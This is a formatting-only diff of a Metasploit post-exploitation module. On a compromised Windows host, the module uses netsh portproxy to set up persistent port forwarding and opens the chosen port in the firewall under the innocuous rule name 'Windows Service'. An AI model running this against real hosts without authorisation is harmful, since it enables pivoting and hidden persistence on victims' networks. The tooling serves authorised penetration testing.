@@ -6,30 +6,34 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Manage Set Port Forwarding With PortProxy',
-      'Description'   => %q{
-        This module uses the PortProxy interface from netsh to set up
-        port forwarding persistently (even after reboot). PortProxy
-        supports TCP IPv4 and IPv6 connections.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
-      'Platform'      => 'win',
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Manage Set Port Forwarding With PortProxy',
+        'Description' => %q{
+          This module uses the PortProxy interface from netsh to set up
+          port forwarding persistently (even after reboot). PortProxy
+          supports TCP IPv4 and IPv6 connections.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'Borja Merino <bmerinofe[at]gmail.com>'],
+        'Platform' => 'win',
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
 
     register_options(
       [
-        OptAddress.new('LOCAL_ADDRESS',   [ true, 'IPv4/IPv6 address to which to listen.']),
+        OptAddress.new('LOCAL_ADDRESS', [ true, 'IPv4/IPv6 address to which to listen.']),
         OptAddress.new('CONNECT_ADDRESS', [ true, 'IPv4/IPv6 address to which to connect.']),
-        OptPort.new(   'CONNECT_PORT',    [ true, 'Port number to which to connect.']),
-        OptPort.new(   'LOCAL_PORT',      [ true, 'Port number to which to listen.']),
-        OptBool.new(   'IPV6_XP',         [ true, 'Install IPv6 on Windows XP (needed for v4tov4).', true]),
-        OptEnum.new(   'TYPE',            [ true, 'Type of forwarding', 'v4tov4', ['v4tov4','v6tov6','v6tov4','v4tov6']])
-      ])
-    end
+        OptPort.new('CONNECT_PORT', [ true, 'Port number to which to connect.']),
+        OptPort.new('LOCAL_PORT', [ true, 'Port number to which to listen.']),
+        OptBool.new('IPV6_XP', [ true, 'Install IPv6 on Windows XP (needed for v4tov4).', true]),
+        OptEnum.new('TYPE', [ true, 'Type of forwarding', 'v4tov4', ['v4tov4', 'v6tov6', 'v6tov4', 'v4tov6']])
+      ]
+    )
+  end
 
   def run
     if not is_admin?
@@ -44,14 +48,14 @@ class MetasploitModule < Msf::Post
     end
 
     return unless enable_portproxy
-    fw_enable_ports
 
+    fw_enable_ports
   end
 
   def enable_portproxy
     rtable = Rex::Text::Table.new(
       'Header' => 'Port Forwarding Table',
-      'Indent' =>  3,
+      'Indent' => 3,
       'Columns' => ['LOCAL IP', 'LOCAL PORT', 'REMOTE IP', 'REMOTE PORT']
     )
 
@@ -70,7 +74,7 @@ class MetasploitModule < Msf::Post
       print_good("PortProxy added.")
     end
 
-    output = cmd_exec("netsh","interface portproxy show all")
+    output = cmd_exec("netsh", "interface portproxy show all")
     output.each_line do |l|
       rtable << l.split(" ") if l.strip =~ /^[0-9]|\*/
     end
@@ -79,7 +83,7 @@ class MetasploitModule < Msf::Post
   end
 
   def ipv6_installed()
-    output = cmd_exec("netsh","interface ipv6 show interface")
+    output = cmd_exec("netsh", "interface ipv6 show interface")
     if output.lines.count > 2
       return true
     else
@@ -97,7 +101,7 @@ class MetasploitModule < Msf::Post
       return false
     else
       print_status("Installing IPv6... can take a little long")
-      cmd_exec("netsh","interface ipv6 install",120)
+      cmd_exec("netsh", "interface ipv6 install", 120)
       if not ipv6_installed
         print_error("IPv6 was not successfully installed. Run it again.")
         return false
@@ -110,11 +114,11 @@ class MetasploitModule < Msf::Post
   def fw_enable_ports
     print_status("Setting port #{datastore['LOCAL_PORT']} in Windows Firewall ...")
     if sysinfo["OS"] =~ /Windows 7|Vista|2008|2012/
-      cmd_exec("netsh","advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{datastore['LOCAL_PORT']}\"")
+      cmd_exec("netsh", "advfirewall firewall add rule name=\"Windows Service\" dir=in protocol=TCP action=allow localport=\"#{datastore['LOCAL_PORT']}\"")
     else
-      cmd_exec("netsh","firewall set portopening protocol=TCP port=\"#{datastore['LOCAL_PORT']}\"")
+      cmd_exec("netsh", "firewall set portopening protocol=TCP port=\"#{datastore['LOCAL_PORT']}\"")
     end
-    output = cmd_exec("netsh","firewall show state")
+    output = cmd_exec("netsh", "firewall show state")
 
     if output =~ /^#{datastore['LOCAL_PORT']} /
       print_good("Port opened in Windows Firewall.")
